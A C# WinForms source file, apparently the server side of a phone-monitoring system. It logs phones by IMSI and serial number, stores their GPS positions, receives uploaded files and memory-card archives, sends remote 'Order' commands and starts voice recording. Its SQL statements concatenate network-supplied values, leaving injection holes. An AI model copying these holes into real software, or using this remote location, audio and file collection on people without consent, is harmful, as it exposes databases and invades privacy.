using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using TalkComLib;
using AndroidTalkComLib;
using System.Runtime.InteropServices;
using System.Data.OleDb;
using System.Diagnostics;
using System.Collections;

namespace sever2
{
    public partial class Phone : Form
    {
        public Phone()
        {
            
            initServerIP();
            initIPEndPoint();

            InitializeComponent();

            //��tabPage1���ն˹���ѡ�������
            this.tabPage1.Parent = null;
        }


        public static string getP2PIPAddress()
        {
            return SERVERIP;
            /*
            bool[] bad = new bool[15];
            for (int i = 0; i < 15; ++i) {
                bad[i] = false;
            }
            for (int i = 0; i < 15; ++i) {
                if (P2P_OLD[i] == '0') {
                    if (i == 0) bad[i] = true;
                    if (i == 1 && P2P_OLD[i - 1] == '0') bad[i] = true;
                    if (i >= 2 && P2P_OLD[i - 1] == '.') bad[i] = true;
                    if (i >= 2 && P2P_OLD[i - 1] == '0' && P2P_OLD[i - 2] == '.') bad[i] = true;
                }
            }
            string ret = "";
            for (int i = 0; i < 15; ++i) {
                if (!bad[i]) ret = ret.Insert(ret.Length, P2P_OLD.Substring(i, 1));
            }
            
            //MessageBoxTimeOut showIP = new MessageBoxTimeOut();
            //showIP.Show(ret, "new IP", 3000);
            return ret;
             */
            
        }

        private String initServerIP()
        {
            //SERVERIP
            String address = "";
            StreamReader fileStream = null;
            try
            {
                fileStream = new StreamReader(configFile, System.Text.Encoding.Default);
              
                address += fileStream.ReadLine();
                
                fileStream.Close();
                fileStream.Dispose();
            }
            catch
            {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("����IPʧ��");
            }

            SERVERIP = address;

            initIPEndPoint(); //�������ӵ�ַ��
            return address;

        }
        private void Phone_Load(object sender, EventArgs e)
            
        {
            initServerIP();
            initIPEndPoint();

            toolStripStatusLabel1.Text = "׼������";
            lis = true;
            
           GetTree(); //���ؿͻ�����Ϣ             
           login();   //����������ƶ�������     
           
           //yuyinM();   //����mobile��������
           yuyinS();  //����Symbian��������   

           
           loadingPage(); //���ص�ͼҳ��
           loadingPlace(displayLoc); //����λ����Ϣ
        }

        #region ȫ�ֱ���   
 
       
        FileStream MyFileStream;     
        TcpListener lisner1;
        bool lis;
        //static string P2P_OLD = "202.004.155.187";  //������IP��ַ
        //static string P2P_OLD = "202.004.155.187";
        String configFile = AppDomain.CurrentDomain.BaseDirectory + "ServerIP.config";
        static string SERVERIP = "202.4.155.37";
        //static string P2P_OLD = "119.118.095.229";    //����������IP��ַ

        static string cord = "";  //��һ��ѡ��ľ�γ��

        static int displayLoc = 18;

        Interface iface;
        AndroidVoiceInterface Aface;



        static bool clientTree = true;
        static bool locTree = true;

        IPEndPoint TranTo = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), 4000);
        static IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
        static IPEndPoint severM = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));

        private void initIPEndPoint()
        {
            TranTo = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), 4000);
            sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
            severM = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));
        }



        Socket Log ; //���ƶ��������������
        Socket SocketS = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//�ļ������� 
        string FileNow;           //��¼��ǰ����д����ļ���
        IPEndPoint symTemp = new IPEndPoint(IPAddress.Any, 2007);
        IPEndPoint mobTemp = new IPEndPoint(IPAddress.Any, 10001);
       

        //public static DateTime now = DateTime.Now;
        #endregion


        #region  ���ؿͻ�����Ϣ

        public void GetTree()
        {

            treeView2.Nodes.Clear();
            string PhoneNum, PhoneID, Flag, Time,OS;

            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            string sqlU = "update Client set Flag ='" + "Off" + "' where Flag = '" + "On" + "'";
            OleDbCommand myCmd = new OleDbCommand(sqlU, conn);
            myCmd.ExecuteNonQuery();
            string sql = "select * from Client ";
            myCmd = new OleDbCommand(sql, conn);

            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                PhoneNum = datareader["PhoneNum"].ToString();         //IMSI��
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID+" "+OS;
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
            }
            conn.Close();
        }

        public void GetTreeTest()
        {
            treeView2.Nodes.Clear();
            string PhoneNum, PhoneID, Flag, Time,OS;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client Order by SendTime DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            int num=0;

            while (datareader.Read())
            {       
                PhoneNum = datareader["PhoneNum"].ToString();
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID + " " + OS;                
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                /*
                string sqlT = "update Client set Flag ='" + "Off" + "' where  SendTime = '" + Time + "'";
                
                if (Flag.CompareTo("On") == 0)
                {
                    //����Ƿ���� ���������� ����ΪOff
                    System.DateTime date3 = Convert.ToDateTime(Time);
                    System.DateTime ComTime = System.DateTime.Now;
                    System.TimeSpan diff2 = ComTime - date3;

                    if (diff2.TotalMinutes > 2)
                    {
                        OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                        myCmd1.ExecuteNonQuery();
                        //MessageBox.Show(OS +"@" + PhoneID + "@�ͻ��˵���");
                        treeView2.Nodes.Add(PhoneNum, PhoneNum,18);                        
                        //treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                    }
                    else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                        if (PhoneNum.CompareTo(SelectBefore) == 0) //Ϊˢ��ǰѡ�еĿͻ���
                            treeView2.SelectedNode =treeView2.Nodes[num-1];
                    }
                }
                else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                    }

                */
                treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                num++;

            }

            conn.Close();
        }

        public void ClientOffline()
        {
            
            string PhoneNum, PhoneID, Flag, Time, OS;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client Order by SendTime DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            int num = 0;

            while (datareader.Read()) {
                PhoneNum = datareader["PhoneNum"].ToString();
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                //20111214
                PhoneNum = PhoneNum + " " + PhoneID + " " + OS;
                //PhoneNum = PhoneNum + System.Environment.NewLine + PhoneID + System.Environment.NewLine + OS;
                string sqlT = "update Client set Flag ='" + "Off" + "' where  SendTime = '" + Time + "'";
                if (Flag.CompareTo("On") == 0) {
                    OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                    myCmd1.ExecuteNonQuery();
                    //treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
                    num++;
               } 
                else {
                    //treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
                    num++;
                }
            }

            conn.Close();
        }
        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
           // treeView1.SelectedImageIndex = treeView2.SelectedNode.ImageIndex;
        }

        #endregion

        #region  ����ע��

        public void connectServer(object source, System.Timers.ElapsedEventArgs e)
        {
            try {
                Byte[] send = Encoding.ASCII.GetBytes("Moniter");
                if (Log == null) return;
                TransferFiles.SendVarData(Log, send);        //���������������ע��  
            } catch {

            }
        } 
               //TCPע��
        private void loginT()
        {
            //�̲߳����Ƿ����
            //ע���ÿ��10s��ע��һ��
            System.Timers.Timer t = new System.Timers.Timer(3000);  //ʵ����Timer�࣬���ü��ʱ��Ϊ10000���룻   
            t.Elapsed += new System.Timers.ElapsedEventHandler(connectServer);  //����ʱ���ʱ��ִ���¼���   
            t.AutoReset = true;  //һֱִ��(true)��   
            t.Enabled = true; //�Ƿ�ִ��System.Timers.Timer.Elapsed�¼���   

            while (true)
            {
                try
                {
                    //20120221�ر��ϴ�Log,�����½�������
                    if (Log != null) Log.Close();
                    Log = null;

                    //���ߺ������пͻ�������
                    //GetTree();

                    Log= new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    Log.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 60 * 1000);
                    IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("6000"));                  
                    Byte[] send = Encoding.ASCII.GetBytes("Moniter");

                    //��������ǰ�������ֻ�������
                    

                    //int countCon = 0; //�������Ӵ���
                    while (true)
                    {
                        
                        try
                        {
                            //20120221����ط�������
                            //if (Log.Connected)
                            //{
                            //   break;
                            //}
                            //else
                            {
                                Thread.Sleep(1000);  //�ȴ���S������
                                toolStripStatusLabel4.Text = getP2PIPAddress() + ": �����쳣�������δ����";
                                Log.Connect(sever);
                                break;
                            }
                        }
                        catch
                        {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ": �����쳣�������δ����";
                        }
                    }
                    TransferFiles.SendVarData(Log, send);        //���������������ע��  

                    while (true)   //���շ������˵���Ϣ
                    {
                        //<>
                        byte[] tempKZ = TransferFiles.ReceiveVarData(Log);
                        string sTemp1 = Encoding.ASCII.GetString(tempKZ);
                        if (tempKZ.Length == 0) {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ":�����쳣�������δ����..";
                            ClientOffline();
                            //MessageBox.Show("�����쳣�������δ����")
                            break;
                        } 
                        else {
                            toolStripStatusLabel4.Text = getP2PIPAddress() + ":��¼�������ɹ�";
                        }

                        if (sTemp1.IndexOf("FileName") != -1)  //���յ������ļ���ʱ
                        {
                           //MessageBox.Show("�յ��ļ���:" + sTemp1);
                           // FileDown(sTemp1);   
                            string[] pinfor = sTemp1.Split('@');
                            string filename = pinfor[1] + "@" + pinfor[2] + "@" + pinfor[3] + "@" + pinfor[4];
                            //�����ֻ���ӵ��ͻ��б�
                            //PhoneZC@
                            /*string SHOW = "";
                            for (int i = 0; i < pinfor.Length; ++i) {
                                SHOW += pinfor[i];
                                SHOW += "\n";
                            }
                            MessageBox.Show(SHOW);
                            */

                            string OS = "Android";
                            //string PhoneNum = pinfor[1];  //IMSI��
                            //string PhoneID = pinfor[2];   //���к�
                            string PhoneNum = pinfor[2];  //���к�
                            string PhoneID = pinfor[1];   //IMSI��
                            ClientOnline(PhoneNum, PhoneID, OS);  

                            StartReceive(filename);
                        }

                        if (sTemp1.IndexOf("Location") != -1) { //���յ���λ����Ϣʱ
                            string[] pinfor = sTemp1.Split('@');

                            //MessageBox.Show(sTemp1);

                            if (pinfor.Length == 6) {
                                string OS = pinfor[1];
                                string PhoneNum = pinfor[2];  //IMSI��
                                string PhoneID = pinfor[3];   //���к�
                                string Longitude = pinfor[4];
                                string Latitude = pinfor[5];
                                bool ok = true;
                                if (PhoneID.Length != 15) ok = false;
                                if (PhoneNum.Length != 15) ok = false;

                                //�����ֻ���ӵ��ͻ��б�
                                //PhoneZC@
                                ClientOnline(PhoneID, PhoneNum, OS); 

                                try {
                                    double longti = System.Convert.ToDouble(Longitude);
                                    double lati = System.Convert.ToDouble(Latitude);
                                } catch {
                                    ok = false;
                                }
                                if (ok) {
                                    InsertIntoTable(OS, PhoneNum, PhoneID, Longitude, Latitude);
                                    locTree = true;
                                }
                            }
                        }
                        /*   //ע�͵��ֻ�ע��ģ��
                        if (sTemp1.IndexOf("PhoneZC") !=-1) //���յ������ֻ�ע����Ϣʱ
                        {
                            string[] pinfor = sTemp1.Split('@');
                            if (pinfor.Length == 4) {
                                string OS = pinfor[1];
                                string PhoneNum = pinfor[2];  //IMSI��
                                string PhoneID = pinfor[3];   //���к�
                                bool ok = true;
                                if (PhoneID.Length != 15) ok = false;
                                if (PhoneNum.Length != 15) ok = false;
                                if (ok) {
                                    ClientOnline(PhoneNum, PhoneID, OS);      //���¿ͻ����б�  
                                    Command(PhoneNum, PhoneID, OS);
                                }
                            }

                        }*/
                        if (sTemp1.IndexOf("AndAReg") != -1) { //android�������յ���
                            //����android������������
                            string[] pinfor = sTemp1.Split('@');
                            //andareg@IMEI@IMSI
                            string PhoneNum = pinfor[1];
                            string PhoneID = pinfor[2];

                            //�����ֻ���ӵ��ͻ��б�
                            ClientOnline(PhoneID, PhoneNum, "Android"); 

                            //��Debug\ReceviceFile\Voice�н���һ���Ե�ǰ�����������ļ���
                            // string RTime = System.DateTime.Now.ToShortDateString();
                            string RTime = System.DateTime.Now.ToString("yyyy-MM-dd");
                            string fileSub = "Voice\\" + RTime;
                            string path = FileCreateSub(fileSub);

                            //�ļ����� ʱ���ȡ   �ļ���ʽ 34567890@1342222222@2011-2-16 20;59;08.amr
                            //string TimeFull = System.DateTime.Now.ToString();
                            string TimeFull = System.DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss");
                            string Name = TimeFull.Replace(':', ';');

                            //string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                            string RecordFileName = Name + ".wav";
                            string fileFullName = path + "\\" + RecordFileName;
                            FileNow = fileFullName;


                            Aface = new AndroidVoiceInterface();
                            //MessageBox.Show("Android test...��ʼ���ɹ�");
                            Aface.Ini(FileNow, getP2PIPAddress());
                        }


                    }
                }
                catch
                {
                    toolStripStatusLabel4.Text = getP2PIPAddress() + ":�����쳣�������δ����...";
                    ClientOffline();
                    if (Log != null)
                        Log.Close();
                    Log = null;
                }
            }
        }

        void InsertIntoTable(string OS, string PhoneNum, string PhoneID, string Longitude, string Latitude)
        {
            try {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                DataTable dt = new DataTable();
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                String Time = DateTime.Now.ToString();

                string sqlI = "insert into Location ( PhoneNum, PhoneID, Latitude, Longitude,  OS, ArriveTime) values ('" +
                    PhoneNum + "','" + PhoneID + "','" + Latitude + "','" + Longitude + "','" + OS + "','" + Time + "')";
                OleDbCommand myCmd = new OleDbCommand(sqlI, conn);
                //MessageBox.Show(sqlI); //it's a comment
                int AFFECTED = myCmd.ExecuteNonQuery();
                //MessageBox.Show("" + AFFECTED);
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException e) {
                //MessageBox.Show(e.ToString().Substring(300));
            }
            catch (System.InvalidOperationException e) {
                //MessageBox.Show(e.ToString());
            }

        }
        void Command(string PhoneNum ,string PhoneID,string OS)
        {
            //��������͵������� �����Ѿ������õĵ������Ϳ��ƶ������� �������ʽ Order@PhoneNum@PhoneID@Content             
           
            string[] a = new string[] { };

            a = GetCommand(PhoneID, PhoneNum, OS);              //ÿ���յ��ֻ�ע��ͻ�ȡ�Ƿ��д��ֻ�������

            if (a != null)                        //�д��ֻ�������ʱ
            {
                i = 0;
                while (a[i] != null)
                {
                    if (a[i].CompareTo("Voice") != 0)
                    {
                        try
                        {
                            string Content = a[i];
                            string command = "Order" + "@" + PhoneNum + "@" + PhoneID + "@" + Content;
                            byte[] msg = Encoding.UTF8.GetBytes(command);
                            MessageBoxTimeOut temp1 = new MessageBoxTimeOut();
                           temp1.Show("���ֻ���" + PhoneID + "��������" + a[i], "�������ʾ", 3000);
                           

                            TransferFiles.SendVarData(Log, msg);

                            //��2s���ٷ�����һ������
                            //Thread.Sleep(2000);

                            if (a[i].CompareTo("Stop") == 0 && (OS.CompareTo("Mobile") == 0 || OS.CompareTo("IPhone") == 0))
                            {
                                if (iface != null)
                                    iface.BeClose();
                                //StopyuyinM();

                            }
                            if (a[i].CompareTo("Stop") == 0 && OS.CompareTo("Symbian") == 0)
                            {                               
                                //StopyuyinS();
                            }
                            i++;
                        }
                        catch //(Exception E)
                        {
                           // MessageBox.Show(E.ToString());
                        }
                    }
                    else                                                          //����������������ʱ
                    {
                        string Content = a[i];
                        string command = "Order" + "@" + PhoneNum + "@" + PhoneID + "@" + Content;
                        byte[] msg = Encoding.UTF8.GetBytes(command);
                                          
                        MessageBoxTimeOut temp1 = new MessageBoxTimeOut();
                        temp1.Show("���ֻ���" + PhoneID + "��������" + a[i], "�������ʾ", 3000);
                       
                        TransferFiles.SendVarData(Log, msg);

                        //������ͬϵͳ���д���
                        FileVoiceCreate(PhoneID, PhoneNum, OS);
                        //ÿ����һ��������������Debug\ReceviceFile\Voice�н���һ���Ե�ǰ�����������ļ��м����еĽ����ļ� ������ʽ �ֻ���@���к�@ʱ��
                        if (OS.CompareTo("Symbian") == 0)                          //Symbian��������
                        {
                            if (File.Exists(MyFileName))
                                File.Delete(MyFileName);
                            if (File.Exists(MyFileName2))
                                File.Delete(MyFileName2);
                            if (File.Exists(MyFileName11))
                                File.Delete(MyFileName11);
                            if (File.Exists(MyFileName21))
                                File.Delete(MyFileName21);
                           //yuyinS();
                        }
                        if (OS.CompareTo("Mobile") == 0 || OS.CompareTo("IPhone") == 0)
                        {
                            iface = new Interface();                           //Windows Mobile����������  
                            iface.Ini(FileNow, getP2PIPAddress());
                            
                          //  yuyinM();
                          //  MessageBox.Show(FileNow);

                            try
                            {
                          //      Ini(FileNow);
                            }
                            catch (Exception e)
                            {
                           //     MessageBox.Show("ini" + e.ToString());
                            }
                        }
                        if (OS.CompareTo("Android") == 0)                              //Android��������
                        {
                           
                            try
                            {
                                Aface = new AndroidVoiceInterface();
                                //MessageBox.Show("Android test...��ʼ���ɹ�");
                                Aface.Ini(FileNow, getP2PIPAddress());
                            }
                            catch (Exception e)
                            {
                                   MessageBox.Show("Android������-ini" + e.ToString());
                            }
                        }
                        toolStripStatusLabel1.Text = System.DateTime.Now.ToString();
                        i++;
                    }
                }
            }
        }
        #endregion

        #region ����߳̽����ֻ�ע�ắ��     12.15�Ÿ�

        //������߳�
        public void Order()
        {

            IPEndPoint TranFrom = new IPEndPoint(IPAddress.Any, 4000);//����4000�˿�              

            lisner1 = new TcpListener(TranFrom);
            lisner1.Start();

            while (true)
            {
                try
                {
                    while (lis)
                    {
                        if (!lisner1.Pending())
                        {
                            Thread.Sleep(1000);
                            continue;
                        }

                        //  if (SocketS != null) SocketS.Close();
                        //���ܷ����������ֻ�ע����Ϣ��Socket
                        SocketS = lisner1.AcceptSocket();
                        SocketS.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        //ÿ����һ�����Ӵ���һ���µ��߳̽��н��գ����̼߳�������
                        ParameterizedThreadStart pts = new ParameterizedThreadStart(OrderSub);
                        Thread ThreadReceive = new Thread(pts);
                        ThreadReceive.IsBackground = true;
                        ThreadReceive.Start(SocketS);
                    }

                }
                catch
                {
                  
                }
            }
        }

        public void OrderSub(object obj)
        {
            Socket SocketS = (Socket)obj;
            try
            {
                //�����ֻ��˴������ֻ����ӣ����
                while (true)
                {
                    byte[] temp = TransferFiles.ReceiveVarData(SocketS);
                    string temp2 = System.Text.Encoding.ASCII.GetString(temp);
                   
                    if (temp.Length == 0)                      
                        break;
                    else
                    {
                        string[] pinfor = temp2.Split('@');   //����1031                      
                        string OS = pinfor[0];
                        string PhoneNum = pinfor[1];  //IMSI��
                        string PhoneID = pinfor[2];   //���к�
                        bool ok = true;
                        if (PhoneNum.Length != 15) ok = false;
                        if (PhoneID.Length != 15) ok = false;
                        if (ok) {
                            ClientOnline(PhoneNum, PhoneID, OS);
                        }
                       
                             //�ڽ�������ʾ�ֻ�����״̬
                        
                    }
                }

            }
            catch
            {             

            }
            finally
            {
                SocketS.Close();
            }
        }
        #endregion

        #region ���ܺ��� ��ʼ�����ļ�
        //����߳̽����ļ�
        private void StartReceive(string filename)
        {
         
              Byte[] send = Encoding.ASCII.GetBytes("FileAsk"+"@"+filename);
             try
                {
                    Socket client= new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("7000"));                  
                 
                    while (true)
                    {
                        try
                        {
                            if (client.Connected)
                            {                               
                                break;
                            }
                            else
                            {
                                client.Connect(sever);
                            }
                        }
                        catch
                        {
                            
                        }
                    }
                    TransferFiles.SendVarData(client, send);        //����������������ļ���
                   
                   //���յ������������ļ�
                    FileSub(client);                    
                
                }
                 catch
                  {
                 
                  }
            }

        public void FileSub(Socket client)
        {
            //���[�ļ���]   
            string SendFileName = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
          
  
            //���[���Ĵ�С]   
            string bagSize = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
            //MessageBox.Show("����С" + bagSize);   
  
            //���[����������]   
            int bagCount = int.Parse(System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client)));   
            //MessageBox.Show("����������" + bagCount);   
  
            //���[���һ�����Ĵ�С]   
            string bagLast = System.Text.Encoding.Unicode.GetString(TransferFiles.ReceiveVarData(client));   
            //MessageBox.Show("���һ�����Ĵ�С" + bagLast);   
          
            string[] pinfor = SendFileName.Split('@');   //����1031                
           
            string PhoneID = pinfor[0];
            string PhoneNum = pinfor[1];
            string ShortName = pinfor[3];
            MessageBoxTimeOut FileShow = new MessageBoxTimeOut();
            
            //����һ�����ļ�
            string path = FileCreateSub(PhoneID);
            string RTime = "";
            if (!ShortName.ToLower().EndsWith(".zip")) {
                //�������zip�ļ�����ȷ������
                RTime = System.DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss-ffff");
            } else {
                //�����zip�ļ�����ȷ����
                RTime = System.DateTime.Now.ToString("yyyy_MM_dd");
            }
            
            SendFileName = PhoneNum + "@" + RTime +"@"+ ShortName;

            string fileFullName = path + "\\" + SendFileName;

             //����һ�����ļ�   
            MyFileStream = new FileStream(fileFullName, FileMode.Create, FileAccess.Write);     

            //�ѷ��Ͱ��ĸ���
            int SendedCount = 0;
            byte[] data;
            int TotalSize = 0;
            while (true)
            {
                data = TransferFiles.ReceiveVarData(client);
                if (data.Length == 0)
                {
                    break;
                }
                else
                {
                    TotalSize += data.Length;
                    SendedCount++;
                    //�����յ������ݰ�д�뵽�ļ�������
                    MyFileStream.Write(data, 0, data.Length);
                    MyFileStream.Flush();
                    MyFileStream.Close();
                    break;
                }
            }
            float temp2 = 0;
            string t;

            float temp1 = TotalSize / 1024;


            if (temp1 > 1024)
            {
                temp2 = temp1 / 1024;

                t = temp2.ToString() + "MB";

            }
            else if (temp1 < 1)
            {
                t = "1KB";
            }
            else t = temp1.ToString() + "KB";

            //�ر��ļ���
            if (MyFileStream != null)
                MyFileStream.Close();
            client.Close();


            if (!ShortName.ToLower().EndsWith(".zip")) {
                FileShow.Show(ShortName, "�յ��ļ���ʾ", 3000);
            }
            //����־λ��ΪFinished=1
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string now = System.DateTime.Now.ToString();
            string finished = "update Client set Finished ='" + "1" + "'where  PhoneID = '" + PhoneID + "'and PhoneNum='" + PhoneNum + "'";
            OleDbCommand fish_Cmd = new OleDbCommand(finished, conn);
            fish_Cmd.ExecuteNonQuery();
            conn.Close();


            //��ӵ�dgv��
            // �ֻ��ţ��ļ������ļ���С�����ʱ�� 
            //�����zip�ļ�Ƭ�ϵĵ�һ���������dgv�����zip�ļ�Ƭ�ϲ�����
            
            if (SendFileName.ToLower().EndsWith(".zip")) {
                String[] real = ShortName.Split('-');
                int all = int.Parse(real[0]);
                //���յ����һ��zip�ļ�Ƭ��ʱ���������dgv��
                if(int.Parse(real[1]) == int.Parse(real[0])) {
                    //�ȴ�һ���ӣ����Բ鿴�Ƿ������ļ�Ƭ�϶����ճɹ�,���������
                    int tryTime = 0;
                    bool already = false;
                    while (tryTime < 5) {
                        already = true;
                        //����Ŀ¼�µ�xx-xx-xx.zip�Ƿ񶼴���
                        
                        
                        for (int i = 1; i <= all; ++i) {
                            String prefix = PhoneNum + "@" + RTime + "@" + String.Format("{0:d}-{1:d}-{2}-mmc.zip", all, i, real[2]);
                            String filePath = path + "\\" + prefix;
                            
                            if (!System.IO.File.Exists(filePath)) {
                                already = false;
                            }
                            if (!already) break;
                        }
                       
                        if (already) break;
                        //������ļ�û��������������ͣ30s����
                        System.Threading.Thread.Sleep(30000);
                        ++tryTime;

                    }
                    //���ļ�Ƭ�ϴ���ʧ��
                    if (!already) return;
                    //�������ļ�д�뵽һ���ļ���
                    String prefixTmp = PhoneNum + "@" + RTime + "@" + String.Format("{0}-mmc.zip", real[2]);
                    String finalName = path + "\\" + prefixTmp;
                    FileStream stream = new FileStream(finalName, FileMode.Create, FileAccess.Write);
                    for (int i = 1; i <= all; ++i) {
                        String prefix = PhoneNum + "@" + RTime + "@" + String.Format("{0:d}-{1:d}-{2}-mmc.zip", all, i, real[2]);
                        String filePath = path + "\\" + prefix;
                        //��ȡÿһ���ļ�������д��stream��
                        //FileShow.Show(filePath, "File", 5000);
                        FileStream streamTmp = new FileStream(filePath, FileMode.Open);
                        BinaryReader br = new BinaryReader(streamTmp);
                        try {
                            byte[] content = br.ReadBytes((int)streamTmp.Length);
                            stream.Write(content, 0, content.Length);
                            stream.Flush();
                        } catch(Exception e) {

                        }
                        br.Close();
                        if (File.Exists(filePath)) {
                            File.Delete(filePath);
                        }
                        streamTmp.Close();

                    }
                    stream.Close();
                    string DoneTime = System.DateTime.Now.ToString();
                    AddRow(PhoneNum, PhoneID, prefixTmp, t, DoneTime, finalName);
                    FileShow.Show(prefixTmp, "File", 3000);
                }
               
            } else {
                string DoneTime = System.DateTime.Now.ToString();
                AddRow(PhoneNum, PhoneID, SendFileName, t, DoneTime, fileFullName); 
            }
           
            
    }
       
        #endregion
        #region ����ʾ��������ĺ���
        private delegate void DelAddRow(object o1, object o2, object o3, object o4, object o5, object o6);

        private void AddRow(object o1, object o2, object o3, object o4, object o5, object o6)
        {
            if (InvokeRequired)
            {
                DelAddRow dar = new DelAddRow(AddRow);
                this.Invoke(dar, o1, o2, o3, o4, o5, o6);
                return;
            }
            this.dataGridView1.Rows.Add(o1, o2, o3, o4, o5, o6);
        }

        #endregion     
      

        private void timer1_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = DateTime.Now.ToString();
        }
       

        private void dataGridView1_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {

            string filename = dataGridView1.SelectedCells[5].Value.ToString();
            
            //�Ȳ鿴filename������
            ////20111117
            if(filename.ToLower().EndsWith(".zip"))
            {
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.FileName = "ShowColorMsg.exe";//��Ҫ�����ĳ�����       
                p.StartInfo.Arguments = filename;//��������       
                p.Start();//����
               
            } else {
                System.Diagnostics.Process.Start(filename);
            }
            
            
        }

        #region ���ݿ�Ĳ���

        //   
        //�����ͻ��ˣ������ݲ���client����      
        private void IntoDatabase1(string t1, string t2, string t3, string t4, string t5, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
        private void IntoDatabase(string t1, string t2, string t3, string t4, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
